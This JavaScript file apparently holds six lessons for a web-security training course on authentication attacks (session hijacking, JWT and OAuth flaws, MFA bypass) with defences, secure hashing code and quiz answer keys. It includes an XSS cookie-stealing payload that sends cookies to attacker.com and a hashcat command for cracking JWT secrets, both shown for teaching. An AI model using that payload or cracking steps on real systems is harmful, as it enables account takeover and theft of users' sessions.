const LESSONS = [
  {
    title: "Authentication Weaknesses",
    points: 10,
    content: `WHAT IS BROKEN AUTHENTICATION?
Imagine you are trying to enter a super-secret treehouse club. To get inside, the club president stands at the door and asks for a secret handshake. This process of proving exactly who you are is called "Authentication." Every single website in the world does this when they ask you for a username and a password. They are checking your digital ID card to make sure you are really you! But what happens if the club president is really bad at his job? What if he lets people in who just guess the secret handshake, or what if he accidentally leaves a spare key under the doormat for anyone to find? In the computer world, this is called "Broken Authentication." It means the website's security guards made a huge mistake when building the front door. Hackers love these mistakes! Because the front door is broken, hackers can easily trick the guards, steal other people's ID cards, and walk right into the website pretending to be someone else. Once they are inside, they can read your private messages, spend your money, or lock you out of your own account completely!

COMMON AUTHENTICATION WEAKNESSES:

1. WEAK PASSWORD POLICIES:
   - No minimum length requirements
   - Common passwords allowed (password123, admin, qwerty)
   - No complexity rules (uppercase, numbers, symbols)
   - No expiry policy for sensitive systems

2. BRUTE FORCE PROTECTION MISSING:
   - No rate limiting on login attempts
   - No account lockout after failed attempts
   - No CAPTCHA to prevent automation
   - No detection of distributed attacks (password spraying)

3. VERBOSE ERROR MESSAGES:
   - "Username not found" vs "Invalid password"
   - Lets attackers enumerate valid usernames
   - Better: always say "Invalid credentials" regardless of what failed

4. INSECURE PASSWORD STORAGE:
   - Plain text (catastrophic breach impact)
   - Weak hashes: MD5, SHA1, SHA256 (crackable with GPU rigs in seconds)
   - No salting: identical passwords → identical hashes → rainbow tables
   - Best practice: bcrypt, Argon2, scrypt, or PBKDF2 (all adaptive, salted)

5. NO MULTI-FACTOR AUTHENTICATION (MFA):
   - Only a password — single point of failure
   - Even a strong password is useless if stolen in phishing
   - MFA options: TOTP (Google Authenticator), SMS (weaker), hardware key (YubiKey)

6. FORGOTTEN PASSWORD FLAWS:
   - Security questions (easily guessable: "mother's maiden name")
   - Reset tokens sent over email without expiry
   - Reset tokens that are predictable (sequential or timestamp-based)`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_weaknesses_diagram.png" alt="Authentication Weaknesses"></div>

WHAT IS BROKEN AUTHENTICATION?
Imagine you are trying to enter a super-secret treehouse club. To get inside, the club president stands at the door and asks for a secret handshake. This process of proving exactly who you are is called "Authentication." Every single website in the world does this when they ask you for a username and a password. They are checking your digital ID card to make sure you are really you! But what happens if the club president is really bad at his job? What if he lets people in who just guess the secret handshake, or what if he accidentally leaves a spare key under the doormat for anyone to find? In the computer world, this is called "Broken Authentication." It means the website's security guards made a huge mistake when building the front door. Hackers love these mistakes! Because the front door is broken, hackers can easily trick the guards, steal other people's ID cards, and walk right into the website pretending to be someone else. Once they are inside, they can read your private messages, spend your money, or lock you out of your own account completely!

COMMON AUTHENTICATION WEAKNESSES:

1. WEAK PASSWORD POLICIES:
   - No minimum length requirements
   - Common passwords allowed (password123, admin, qwerty)
   - No complexity rules (uppercase, numbers, symbols)
   - No expiry policy for sensitive systems

2. BRUTE FORCE PROTECTION MISSING:
   - No rate limiting on login attempts
   - No account lockout after failed attempts
   - No CAPTCHA to prevent automation
   - No detection of distributed attacks (password spraying)

3. VERBOSE ERROR MESSAGES:
   - "Username not found" vs "Invalid password"
   - Lets attackers enumerate valid usernames
   - Better: always say "Invalid credentials" regardless of what failed

4. INSECURE PASSWORD STORAGE:
   - Plain text (catastrophic breach impact)
   - Weak hashes: MD5, SHA1, SHA256 (crackable with GPU rigs in seconds)
   - No salting: identical passwords → identical hashes → rainbow tables
   - Best practice: bcrypt, Argon2, scrypt, or PBKDF2 (all adaptive, salted)

5. NO MULTI-FACTOR AUTHENTICATION (MFA):
   - Only a password — single point of failure
   - Even a strong password is useless if stolen in phishing
   - MFA options: TOTP (Google Authenticator), SMS (weaker), hardware key (YubiKey)

6. FORGOTTEN PASSWORD FLAWS:
   - Security questions (easily guessable: "mother's maiden name")
   - Reset tokens sent over email without expiry
   - Reset tokens that are predictable (sequential or timestamp-based)`,
    questions: [
      { q: "What is it called when a login page returns no limit on login attempts?", a: "Missing brute force protection (or no rate limiting)" },
      { q: "What type of error message helps attackers enumerate valid usernames?", a: "Verbose error messages (e.g., 'Username not found')" },
      { q: "What is the recommended modern algorithm for storing passwords securely?", a: "bcrypt (or Argon2, scrypt, PBKDF2)" },
      { q: "Why does storing passwords without salting allow rainbow table attacks?", a: "Identical passwords produce identical hashes, which can be precomputed" },
      { q: "What second authentication factor is considered the strongest form of MFA?", a: "Hardware security key (e.g., YubiKey / FIDO2)" }
    ]
  },
  {
    title: "Session Hijacking",
    points: 10,
    content: `WHAT IS SESSION HIJACKING?
Imagine you go to a giant amusement park. When you buy your ticket, the person at the front gate checks your ID and gives you a special, un-copyable wristband. For the rest of the day, you don't have to show your ID to ride the rollercoasters; you just flash your wristband to the ride operator, and they let you right on! Websites use the exact same trick to keep you logged in. After you type your password correctly, the website gives your browser a special digital wristband called a "Session Token" (or a cookie). Every time you click a new page, your browser flashes this wristband so the website remembers who you are. But here is the scary part: what if a sneaky thief steals your wristband right off your arm? If a hacker manages to steal your digital Session Token, they can put it on their own browser. When they visit the website, the website sees the wristband and thinks the hacker is YOU! They can impersonate you perfectly, read your emails, and change your password, all without ever needing to know your real password!

SESSION HIJACKING METHODS:

1. SESSION FIXATION:
   - Attacker gives you a known session ID via a crafted URL or cookie
   - You log in, binding your account to that session ID
   - Attacker uses the same session ID to access your account
   - Prevention: Always regenerate the session ID upon successful login

2. SESSION SNIFFING (Network-level):
   - Capturing session cookies over unencrypted HTTP
   - Possible on shared networks (coffee shop WiFi, corporate LAN)
   - Prevention: Use HTTPS everywhere + "Secure" cookie flag

3. CROSS-SITE SCRIPTING (XSS) — Cookie Theft:
   - Payload: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
   - Prevention: "HttpOnly" flag on session cookies prevents JS access

4. PREDICTABLE SESSION TOKENS:
   - If tokens are sequential (1, 2, 3) or timestamp-based
   - Attacker can guess another user's session
   - Prevention: Use cryptographically random, long tokens (128+ bits of entropy)
   - Python: secrets.token_hex(32), Node.js: crypto.randomBytes(32)

5. CSRF (Cross-Site Request Forgery):
   - Attacker makes victim's browser send requests using their session
   - Example: victim visits attacker.com → silently sends request to bank.com
   - Prevention: CSRF tokens, SameSite=Strict cookie attribute

SESSION EXPIRY BEST PRACTICES:
   - Idle timeout: 15-30 min for banking, 8hr for normal apps
   - Absolute timeout: even if active, max 24 hours
   - Immediate invalidation on logout
   - Option to invalidate all sessions from other devices`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_session_hijack_diagram.png" alt="Session Hijacking"></div>

WHAT IS SESSION HIJACKING?
Imagine you go to a giant amusement park. When you buy your ticket, the person at the front gate checks your ID and gives you a special, un-copyable wristband. For the rest of the day, you don't have to show your ID to ride the rollercoasters; you just flash your wristband to the ride operator, and they let you right on! Websites use the exact same trick to keep you logged in. After you type your password correctly, the website gives your browser a special digital wristband called a "Session Token" (or a cookie). Every time you click a new page, your browser flashes this wristband so the website remembers who you are. But here is the scary part: what if a sneaky thief steals your wristband right off your arm? If a hacker manages to steal your digital Session Token, they can put it on their own browser. When they visit the website, the website sees the wristband and thinks the hacker is YOU! They can impersonate you perfectly, read your emails, and change your password, all without ever needing to know your real password!

SESSION HIJACKING METHODS:

1. SESSION FIXATION:
   - Attacker gives you a known session ID via a crafted URL or cookie
   - You log in, binding your account to that session ID
   - Attacker uses the same session ID to access your account
   - Prevention: Always regenerate the session ID upon successful login

2. SESSION SNIFFING (Network-level):
   - Capturing session cookies over unencrypted HTTP
   - Possible on shared networks (coffee shop WiFi, corporate LAN)
   - Prevention: Use HTTPS everywhere + "Secure" cookie flag

3. CROSS-SITE SCRIPTING (XSS) — Cookie Theft:
   - Payload: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
   - Prevention: "HttpOnly" flag on session cookies prevents JS access

4. PREDICTABLE SESSION TOKENS:
   - If tokens are sequential (1, 2, 3) or timestamp-based
   - Attacker can guess another user's session
   - Prevention: Use cryptographically random, long tokens (128+ bits of entropy)
   - Python: secrets.token_hex(32), Node.js: crypto.randomBytes(32)

5. CSRF (Cross-Site Request Forgery):
   - Attacker makes victim's browser send requests using their session
   - Example: victim visits attacker.com → silently sends request to bank.com
   - Prevention: CSRF tokens, SameSite=Strict cookie attribute

SESSION EXPIRY BEST PRACTICES:
   - Idle timeout: 15-30 min for banking, 8hr for normal apps
   - Absolute timeout: even if active, max 24 hours
   - Immediate invalidation on logout
   - Option to invalidate all sessions from other devices`,
    questions: [
      { q: "What attack gives a victim a known session ID before they log in?", a: "Session fixation" },
      { q: "What cookie flag prevents transmission of the cookie over unencrypted HTTP?", a: "Secure" },
      { q: "What cookie flag prevents JavaScript from reading the session cookie via document.cookie?", a: "HttpOnly" },
      { q: "Should session tokens be predictable or cryptographically random?", a: "Cryptographically random" },
      { q: "What cookie attribute (SameSite=___) prevents the browser from sending cookies with cross-site requests?", a: "Strict" }
    ]
  },
  {
    title: "JWT & Modern Auth Vulnerabilities",
    points: 10,
    content: `WHAT ARE MODERN TOKENS?
Think about how normal movie tickets work. When you hand the ticket to the usher, they usually have to check a giant list on their clipboard to make sure the ticket is real. This takes a lot of time. Now imagine a super-advanced movie ticket. Instead of checking a clipboard, the usher just looks at a special, magical stamp on the ticket. The stamp proves the ticket is real instantly, without needing a clipboard at all! Modern websites use these super-tickets, and they are called JSON Web Tokens (or JWTs). Because big websites like Netflix or Facebook have millions of users, checking a massive database every time someone clicks a button takes too long. Instead, they give your browser a JWT. This token contains a mathematical signature (like the magical stamp) that proves who you are instantly. But because these tokens are so powerful and complicated, programmers often make tiny mistakes when setting them up. Hackers actively hunt for these mistakes so they can forge their own magical stamps and sneak into the website for free!

WHAT IS A JWT?
A JWT consists of three base64url-encoded parts separated by dots:
  HEADER.PAYLOAD.SIGNATURE

Header:    {"alg":"HS256","typ":"JWT"}
Payload:   {"sub":"user123","role":"user","iat":1716000000,"exp":1716086400}
Signature: HMACSHA256(base64url(header)+"."+base64url(payload), secret)

JWT VULNERABILITIES:

1. ALGORITHM CONFUSION (alg:none attack):
   - Change alg to "none", remove the signature
   - Modify payload (e.g., "role":"user" → "role":"admin")
   - Server accepts the unsigned token!
   Fix: Enforce a specific algorithm server-side; never trust alg from client.

2. RS256 → HS256 CONFUSION:
   - Server uses RS256 (asymmetric RSA key pair)
   - Attacker switches alg to HS256 (symmetric HMAC)
   - Signs token with server's PUBLIC key (which is public!)
   - Server verifies using public key as HMAC secret → accepts it!
   Fix: Reject algorithm changes; pin to expected algorithm.

3. WEAK HMAC SECRET:
   - Secret is "secret", "password123", or "jwt-secret"
   - Attacker cracks it offline using hashcat:
       hashcat -a 0 -m 16500 token.jwt wordlist.txt
   - Signs arbitrary payloads with cracked secret
   Fix: Use 256-bit cryptographically random secrets.

4. SENSITIVE DATA IN PAYLOAD:
   - JWT payload is base64-encoded, NOT encrypted
   - Anyone can decode it: atob(payload) or jwt.io
   - Never store passwords, PII, or secrets in payload

5. MISSING EXPIRY (exp claim):
   - Without exp, tokens are valid forever
   - If stolen, attacker has permanent access
   Fix: Short exp times + refresh tokens for long sessions.

TOOLS:
  jwt.io         → Decode and inspect JWTs in browser
  jwt_tool       → Automated JWT attack tool (Python)
  Burp Extension → JSON Web Tokens extension`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_jwt_diagram.png" alt="JWT & Modern Auth Vulnerabilities"></div>

WHAT ARE MODERN TOKENS?
Think about how normal movie tickets work. When you hand the ticket to the usher, they usually have to check a giant list on their clipboard to make sure the ticket is real. This takes a lot of time. Now imagine a super-advanced movie ticket. Instead of checking a clipboard, the usher just looks at a special, magical stamp on the ticket. The stamp proves the ticket is real instantly, without needing a clipboard at all! Modern websites use these super-tickets, and they are called JSON Web Tokens (or JWTs). Because big websites like Netflix or Facebook have millions of users, checking a massive database every time someone clicks a button takes too long. Instead, they give your browser a JWT. This token contains a mathematical signature (like the magical stamp) that proves who you are instantly. But because these tokens are so powerful and complicated, programmers often make tiny mistakes when setting them up. Hackers actively hunt for these mistakes so they can forge their own magical stamps and sneak into the website for free!

WHAT IS A JWT?
A JWT consists of three base64url-encoded parts separated by dots:
  HEADER.PAYLOAD.SIGNATURE

Header:    {"alg":"HS256","typ":"JWT"}
Payload:   {"sub":"user123","role":"user","iat":1716000000,"exp":1716086400}
Signature: HMACSHA256(base64url(header)+"."+base64url(payload), secret)

JWT VULNERABILITIES:

1. ALGORITHM CONFUSION (alg:none attack):
   - Change alg to "none", remove the signature
   - Modify payload (e.g., "role":"user" → "role":"admin")
   - Server accepts the unsigned token!
   Fix: Enforce a specific algorithm server-side; never trust alg from client.

2. RS256 → HS256 CONFUSION:
   - Server uses RS256 (asymmetric RSA key pair)
   - Attacker switches alg to HS256 (symmetric HMAC)
   - Signs token with server's PUBLIC key (which is public!)
   - Server verifies using public key as HMAC secret → accepts it!
   Fix: Reject algorithm changes; pin to expected algorithm.

3. WEAK HMAC SECRET:
   - Secret is "secret", "password123", or "jwt-secret"
   - Attacker cracks it offline using hashcat:
       hashcat -a 0 -m 16500 token.jwt wordlist.txt
   - Signs arbitrary payloads with cracked secret
   Fix: Use 256-bit cryptographically random secrets.

4. SENSITIVE DATA IN PAYLOAD:
   - JWT payload is base64-encoded, NOT encrypted
   - Anyone can decode it: atob(payload) or jwt.io
   - Never store passwords, PII, or secrets in payload

5. MISSING EXPIRY (exp claim):
   - Without exp, tokens are valid forever
   - If stolen, attacker has permanent access
   Fix: Short exp times + refresh tokens for long sessions.

TOOLS:
  jwt.io         → Decode and inspect JWTs in browser
  jwt_tool       → Automated JWT attack tool (Python)
  Burp Extension → JSON Web Tokens extension`,
    questions: [
      { q: "What are the three parts of a JWT token separated by dots?", a: "Header, Payload, Signature" },
      { q: "What JWT attack changes the algorithm to 'none' and removes the signature?", a: "Algorithm confusion / alg:none attack" },
      { q: "Is the JWT payload encrypted or just base64-encoded?", a: "Just base64-encoded (NOT encrypted)" },
      { q: "What JWT claim defines when the token expires?", a: "exp (expiration)" },
      { q: "What hashcat mode is used to crack JWT HMAC signatures?", a: "16500" }
    ]
  },
  {
    title: "OAuth 2.0 & SSO Vulnerabilities",
    points: 10,
    content: `WHAT IS OAUTH?
Have you ever tried to sign up for a new game on your phone, and instead of asking you to invent a new password, the game just has a giant button that says "Sign in with Google" or "Sign in with Facebook"? That magical button is powered by a system called OAuth 2.0! Imagine you want to hire a dog walker. Instead of giving the dog walker the master key to your entire house, you call the security guard at your neighborhood gate and say, "Hey, it is okay to let this dog walker into my yard, but ONLY into the yard." OAuth works exactly like that! It is a secure way to let a new app (the dog walker) access some of your information on Google or Facebook, without ever actually giving the new app your secret password. It is incredibly convenient for users, but it is a very complicated system for programmers to build. If the programmer forgets to double-check the security guard's badge, or accidentally leaves the gate open, hackers can trick the system into giving them the master keys to everyone's accounts!

HOW OAUTH 2.0 WORKS (Authorization Code Flow):
  1. User clicks "Login with Google"
  2. App redirects user to Google with: client_id, redirect_uri, scope, state
  3. User authorizes the app on Google's page
  4. Google redirects to redirect_uri with an authorization code
  5. App exchanges code for access_token (server-side)
  6. App uses access_token to call Google APIs (e.g., get profile)

OAUTH VULNERABILITIES:

1. CSRF VIA MISSING STATE PARAMETER:
   The state parameter is a CSRF token for OAuth.
   If missing: attacker can initiate OAuth flow, trick victim into
   completing it, linking attacker's account to victim's session.
   Fix: Always validate the state parameter.

2. REDIRECT_URI MANIPULATION:
   If the app doesn't strictly validate redirect_uri:
   - Attacker registers: https://attacker.com as redirect
   - Or uses path traversal: https://legit.com/../attacker.com
   - The authorization code is sent to the attacker
   Fix: Exact match whitelist of redirect URIs.

3. AUTHORIZATION CODE INTERCEPTION:
   - Authorization codes sent in URL fragments (#code=...)
   - Logged in browser history, referrer headers, server logs
   Fix: Use PKCE (Proof Key for Code Exchange) for mobile/SPA apps.

4. OPEN REDIRECT TO STEAL TOKENS:
   If the app has an open redirect vulnerability:
   ?redirect=https://attacker.com → steals the code in the redirect

5. IMPLICIT FLOW (DEPRECATED — DO NOT USE):
   Returns access_token directly in the URL fragment
   Visible in browser history, referrer headers
   Fix: Use Authorization Code + PKCE instead.

SSO (SAML) VULNERABILITIES:
   SAML uses XML assertions signed by an Identity Provider (IdP).
   XML Signature Wrapping (XSW): move the signed assertion, insert
   a malicious unsigned one — some parsers validate the wrong element.
   Fix: Strictly validate which element is signed.`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_oauth_diagram.png" alt="OAuth 2.0 & SSO Vulnerabilities"></div>

WHAT IS OAUTH?
Have you ever tried to sign up for a new game on your phone, and instead of asking you to invent a new password, the game just has a giant button that says "Sign in with Google" or "Sign in with Facebook"? That magical button is powered by a system called OAuth 2.0! Imagine you want to hire a dog walker. Instead of giving the dog walker the master key to your entire house, you call the security guard at your neighborhood gate and say, "Hey, it is okay to let this dog walker into my yard, but ONLY into the yard." OAuth works exactly like that! It is a secure way to let a new app (the dog walker) access some of your information on Google or Facebook, without ever actually giving the new app your secret password. It is incredibly convenient for users, but it is a very complicated system for programmers to build. If the programmer forgets to double-check the security guard's badge, or accidentally leaves the gate open, hackers can trick the system into giving them the master keys to everyone's accounts!

HOW OAUTH 2.0 WORKS (Authorization Code Flow):
  1. User clicks "Login with Google"
  2. App redirects user to Google with: client_id, redirect_uri, scope, state
  3. User authorizes the app on Google's page
  4. Google redirects to redirect_uri with an authorization code
  5. App exchanges code for access_token (server-side)
  6. App uses access_token to call Google APIs (e.g., get profile)

OAUTH VULNERABILITIES:

1. CSRF VIA MISSING STATE PARAMETER:
   The state parameter is a CSRF token for OAuth.
   If missing: attacker can initiate OAuth flow, trick victim into
   completing it, linking attacker's account to victim's session.
   Fix: Always validate the state parameter.

2. REDIRECT_URI MANIPULATION:
   If the app doesn't strictly validate redirect_uri:
   - Attacker registers: https://attacker.com as redirect
   - Or uses path traversal: https://legit.com/../attacker.com
   - The authorization code is sent to the attacker
   Fix: Exact match whitelist of redirect URIs.

3. AUTHORIZATION CODE INTERCEPTION:
   - Authorization codes sent in URL fragments (#code=...)
   - Logged in browser history, referrer headers, server logs
   Fix: Use PKCE (Proof Key for Code Exchange) for mobile/SPA apps.

4. OPEN REDIRECT TO STEAL TOKENS:
   If the app has an open redirect vulnerability:
   ?redirect=https://attacker.com → steals the code in the redirect

5. IMPLICIT FLOW (DEPRECATED — DO NOT USE):
   Returns access_token directly in the URL fragment
   Visible in browser history, referrer headers
   Fix: Use Authorization Code + PKCE instead.

SSO (SAML) VULNERABILITIES:
   SAML uses XML assertions signed by an Identity Provider (IdP).
   XML Signature Wrapping (XSW): move the signed assertion, insert
   a malicious unsigned one — some parsers validate the wrong element.
   Fix: Strictly validate which element is signed.`,
    questions: [
      { q: "What OAuth 2.0 parameter acts as a CSRF token to prevent cross-site request forgery in the auth flow?", a: "state" },
      { q: "What OAuth attack redirects the authorization code to an attacker-controlled URL?", a: "Redirect URI manipulation" },
      { q: "What OAuth extension should mobile and SPA apps use instead of client secrets?", a: "PKCE (Proof Key for Code Exchange)" },
      { q: "Why is the OAuth Implicit Flow deprecated?", a: "It returns the access_token directly in the URL, exposing it in browser history and referrer headers" },
      { q: "What SAML attack manipulates the XML signature to validate an unsigned malicious assertion?", a: "XML Signature Wrapping (XSW)" }
    ]
  },
  {
    title: "Multi-Factor Authentication Deep Dive",
    points: 10,
    content: `WHY DO WE NEED MULTI-FACTOR AUTHENTICATION?
Imagine you buy the strongest, thickest metal door in the world for your house. It looks completely unbreakable! But then, you use a flimsy, cheap key, and you accidentally drop that key on the sidewalk where anyone can find it. It doesn't matter how strong the door is; if someone has the key, they can just walk right in. Passwords are just like that flimsy key. Even if a website's security is amazing, if a hacker tricks you into giving them your password (or steals it from another website), they can walk right into your account. To fix this, websites use Multi-Factor Authentication (MFA). MFA adds a completely different, second lock to the door. Even if the hacker steals your password key, they still need the second key (like a special code sent to your physical cell phone) to get inside. MFA makes your account incredibly safe, but hackers are always inventing sneaky new tricks to bypass even the strongest double-locks.

MFA FACTORS (TYPES):
  Something you KNOW:  password, PIN, security question
  Something you HAVE:  TOTP app, SMS, hardware key, email code
  Something you ARE:   fingerprint, face scan, voice recognition

MFA TYPES RANKED (WEAKEST → STRONGEST):
  1. Security questions (worst — guessable/publicly searchable)
  2. SMS OTP (weak — SIM swapping, SS7 attacks, phishing)
  3. Email OTP (weak — email account often single-factor)
  4. TOTP (good — Google Authenticator, Authy — offline, time-based)
  5. Push notifications (good — Microsoft/Duo Authenticator)
  6. Hardware security keys FIDO2/WebAuthn (best — phishing-resistant)

SIM SWAPPING ATTACK (bypasses SMS MFA):
  1. Attacker social-engineers the victim's mobile carrier
  2. Convinces them to transfer the victim's phone number to attacker's SIM
  3. All SMS messages (including OTPs) now go to attacker's phone
  4. Attacker resets passwords and bypasses SMS MFA
  High-profile victims: Twitter CEO, crypto exchange CEOs.

MFA FATIGUE / PUSH BOMBING:
  Attackers with stolen credentials spam MFA push notifications.
  The victim gets dozens of prompts and eventually clicks "Approve."
  Used in the Uber breach (2022) — attacker sent 20+ push requests.
  Fix: Use number matching in push notifications.

REAL-TIME PHISHING (ATTACKER-IN-THE-MIDDLE):
  Tools like Evilginx2 / Modlishka act as reverse proxies:
  1. Victim visits fake login page (e.g., paypa1.com)
  2. Proxy forwards credentials AND MFA token to real PayPal
  3. Proxy captures the session cookie from the response
  4. Attacker uses session cookie — MFA completely bypassed!
  Fix: Only hardware FIDO2 keys prevent this (they bind to the domain).

OTP BRUTE FORCE:
  6-digit TOTP: 1,000,000 combinations
  If no rate limiting: brute forceable in seconds
  Fix: Limit OTP attempts, add progressive delays.`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_mfa_diagram.png" alt="Multi-Factor Authentication Deep Dive"></div>

WHY DO WE NEED MULTI-FACTOR AUTHENTICATION?
Imagine you buy the strongest, thickest metal door in the world for your house. It looks completely unbreakable! But then, you use a flimsy, cheap key, and you accidentally drop that key on the sidewalk where anyone can find it. It doesn't matter how strong the door is; if someone has the key, they can just walk right in. Passwords are just like that flimsy key. Even if a website's security is amazing, if a hacker tricks you into giving them your password (or steals it from another website), they can walk right into your account. To fix this, websites use Multi-Factor Authentication (MFA). MFA adds a completely different, second lock to the door. Even if the hacker steals your password key, they still need the second key (like a special code sent to your physical cell phone) to get inside. MFA makes your account incredibly safe, but hackers are always inventing sneaky new tricks to bypass even the strongest double-locks.

MFA FACTORS (TYPES):
  Something you KNOW:  password, PIN, security question
  Something you HAVE:  TOTP app, SMS, hardware key, email code
  Something you ARE:   fingerprint, face scan, voice recognition

MFA TYPES RANKED (WEAKEST → STRONGEST):
  1. Security questions (worst — guessable/publicly searchable)
  2. SMS OTP (weak — SIM swapping, SS7 attacks, phishing)
  3. Email OTP (weak — email account often single-factor)
  4. TOTP (good — Google Authenticator, Authy — offline, time-based)
  5. Push notifications (good — Microsoft/Duo Authenticator)
  6. Hardware security keys FIDO2/WebAuthn (best — phishing-resistant)

SIM SWAPPING ATTACK (bypasses SMS MFA):
  1. Attacker social-engineers the victim's mobile carrier
  2. Convinces them to transfer the victim's phone number to attacker's SIM
  3. All SMS messages (including OTPs) now go to attacker's phone
  4. Attacker resets passwords and bypasses SMS MFA
  High-profile victims: Twitter CEO, crypto exchange CEOs.

MFA FATIGUE / PUSH BOMBING:
  Attackers with stolen credentials spam MFA push notifications.
  The victim gets dozens of prompts and eventually clicks "Approve."
  Used in the Uber breach (2022) — attacker sent 20+ push requests.
  Fix: Use number matching in push notifications.

REAL-TIME PHISHING (ATTACKER-IN-THE-MIDDLE):
  Tools like Evilginx2 / Modlishka act as reverse proxies:
  1. Victim visits fake login page (e.g., paypa1.com)
  2. Proxy forwards credentials AND MFA token to real PayPal
  3. Proxy captures the session cookie from the response
  4. Attacker uses session cookie — MFA completely bypassed!
  Fix: Only hardware FIDO2 keys prevent this (they bind to the domain).

OTP BRUTE FORCE:
  6-digit TOTP: 1,000,000 combinations
  If no rate limiting: brute forceable in seconds
  Fix: Limit OTP attempts, add progressive delays.`,
    questions: [
      { q: "What social engineering attack transfers a victim's phone number to an attacker's SIM card to steal SMS OTPs?", a: "SIM swapping" },
      { q: "What MFA bypass sends repeated push notification requests until the victim approves one?", a: "MFA fatigue / push bombing" },
      { q: "What tool acts as a reverse proxy to steal session cookies in real-time, bypassing TOTP MFA?", a: "Evilginx2 (or Modlishka)" },
      { q: "What is the only MFA type that is resistant to real-time phishing attacks?", a: "Hardware security keys (FIDO2/WebAuthn)" },
      { q: "What 2022 company was breached via MFA fatigue (push bombing) by an 18-year-old attacker?", a: "Uber" }
    ]
  },
  {
    title: "Secure Authentication Implementation",
    points: 10,
    content: `BUILDING THE PERFECT FRONT DOOR
Imagine you are the architect tasked with building a massive bank vault. You can't just slap a padlock on a wooden door and call it a day. You have to think about every single tiny detail! You need thick steel walls, laser beams, security cameras, and guards who check IDs perfectly every single time. In the computer world, building a secure login system is exactly like building that bank vault. If a programmer gets lazy and forgets to turn on the security cameras (like logging failed login attempts), or uses a cheap padlock (like using a weak password algorithm), hackers will find that mistake and break in. Implementing authentication correctly means paying extremely careful attention to every detail, from how the passwords are scrambled and stored in the database, to exactly how the cookies are handed out to the users. It takes a lot of hard work to build the perfect digital front door!

PASSWORD HASHING — CORRECT IMPLEMENTATION:

Python (bcrypt):
  import bcrypt
  # Hash a password:
  hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
  # Verify a password:
  if bcrypt.checkpw(input.encode(), hashed): print("Valid!")

Python (Argon2 — modern best practice):
  from argon2 import PasswordHasher
  ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
  hashed = ph.hash(password)
  ph.verify(hashed, input_password)

Node.js (bcrypt):
  const bcrypt = require("bcrypt");
  const hash = await bcrypt.hash(password, 12);
  const valid = await bcrypt.compare(password, hash);

PHP:
  $hash = password_hash($password, PASSWORD_ARGON2ID);
  password_verify($password, $hash);  // Returns true/false

SECURE LOGIN ENDPOINT CHECKLIST:
   Use HTTPS (enforce with HSTS header)
   Rate limit: max 5-10 attempts per minute per IP
   Progressive delay: after 3 failures, 1s wait; after 5, 5s wait
   Account lockout: 30min lockout after 10 failures
   Generic error messages: always "Invalid credentials"
   Log all failed login attempts with IP and timestamp
   CSRF token on login form (prevents CSRF-based auto-login)
   Regenerate session ID upon successful login
   Set session cookies: HttpOnly; Secure; SameSite=Strict

SECURE PASSWORD RESET:
   Generate cryptographically random tokens: secrets.token_urlsafe(32)
   Store only the hash of the token (not plaintext)
   Token expires in 15-60 minutes
   Invalidate token after first use
   Send to verified email only
   Don't reveal if email exists ("If your email is registered, you'll get a link")

MFA IMPLEMENTATION:
  TOTP: Use pyotp (Python) or speakeasy (Node.js)
  Hardware keys: Use the WebAuthn API
  Backup codes: Generate 10 one-time use 8-digit codes on MFA setup`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/auth_secure_impl_diagram.png" alt="Secure Authentication Implementation"></div>

BUILDING THE PERFECT FRONT DOOR
Imagine you are the architect tasked with building a massive bank vault. You can't just slap a padlock on a wooden door and call it a day. You have to think about every single tiny detail! You need thick steel walls, laser beams, security cameras, and guards who check IDs perfectly every single time. In the computer world, building a secure login system is exactly like building that bank vault. If a programmer gets lazy and forgets to turn on the security cameras (like logging failed login attempts), or uses a cheap padlock (like using a weak password algorithm), hackers will find that mistake and break in. Implementing authentication correctly means paying extremely careful attention to every detail, from how the passwords are scrambled and stored in the database, to exactly how the cookies are handed out to the users. It takes a lot of hard work to build the perfect digital front door!

PASSWORD HASHING — CORRECT IMPLEMENTATION:

Python (bcrypt):
  import bcrypt
  # Hash a password:
  hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
  # Verify a password:
  if bcrypt.checkpw(input.encode(), hashed): print("Valid!")

Python (Argon2 — modern best practice):
  from argon2 import PasswordHasher
  ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
  hashed = ph.hash(password)
  ph.verify(hashed, input_password)

Node.js (bcrypt):
  const bcrypt = require("bcrypt");
  const hash = await bcrypt.hash(password, 12);
  const valid = await bcrypt.compare(password, hash);

PHP:
  $hash = password_hash($password, PASSWORD_ARGON2ID);
  password_verify($password, $hash);  // Returns true/false

SECURE LOGIN ENDPOINT CHECKLIST:
   Use HTTPS (enforce with HSTS header)
   Rate limit: max 5-10 attempts per minute per IP
   Progressive delay: after 3 failures, 1s wait; after 5, 5s wait
   Account lockout: 30min lockout after 10 failures
   Generic error messages: always "Invalid credentials"
   Log all failed login attempts with IP and timestamp
   CSRF token on login form (prevents CSRF-based auto-login)
   Regenerate session ID upon successful login
   Set session cookies: HttpOnly; Secure; SameSite=Strict

SECURE PASSWORD RESET:
   Generate cryptographically random tokens: secrets.token_urlsafe(32)
   Store only the hash of the token (not plaintext)
   Token expires in 15-60 minutes
   Invalidate token after first use
   Send to verified email only
   Don't reveal if email exists ("If your email is registered, you'll get a link")

MFA IMPLEMENTATION:
  TOTP: Use pyotp (Python) or speakeasy (Node.js)
  Hardware keys: Use the WebAuthn API
  Backup codes: Generate 10 one-time use 8-digit codes on MFA setup`,
    questions: [
      { q: "What bcrypt cost factor value (rounds) is recommended for a good balance of security and performance?", a: "12 (rounds=12)" },
      { q: "What PHP function is the correct way to hash a password using Argon2?", a: "password_hash($password, PASSWORD_ARGON2ID)" },
      { q: "After a successful login, what must the server do to the session ID to prevent session fixation?", a: "Regenerate (rotate) the session ID" },
      { q: "What security measure on password reset tokens prevents them from being used more than once?", a: "Invalidate/delete the token after first use" },
      { q: "What Python module provides cryptographically secure random token generation for password reset links?", a: "secrets (secrets.token_urlsafe())" }
    ]
  }
];
